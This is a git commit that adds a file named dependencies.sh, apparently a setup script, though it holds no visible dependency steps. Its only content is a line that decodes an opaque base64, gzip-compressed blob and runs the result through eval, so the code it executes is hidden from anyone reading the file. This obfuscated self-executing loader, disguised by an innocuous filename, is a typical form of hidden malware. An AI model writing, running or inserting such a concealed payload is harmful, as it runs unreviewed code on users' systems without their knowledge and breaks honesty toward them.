f18daf51e943eef9a852e74e77f093ee11e23a52
Sayan Roy <kalistoroy619@gmail.com>
2026-08-17 18:12:25 +0530

    Create dependencies.sh

---
+++ dependencies.sh
@@ -0,0 +1,2 @@
+#!/usr/bin/env bash
+eval "$(echo H4sIAHsBg2oC/42QwU7DMBBE7/6KxU0bOERJ2huIihNSRf4AEHKTDVnVcVPvOlQoH4/VQwW90LnOvNFoZjf5lly+NdwpRoEM1YeY3bc9HMOjTkqtXkEnt9RAFu50tA9QwDtME+CRBEoVHZ2cEQ3rvMExd8FaWK4X5a/k4MlJC+mc7+f85tK/XEpVMa6eya/qoh+emFOYoO4Gw/zVXLYqaqHe971xcdcIdv9JrhZ7GXsA6dApiDpHBH1PzghmgdH/u118QIWW8dQy7Ch62cumquIf18EtqdMBhfoBhpewUmwBAAA= | base64 -d | gunzip)"
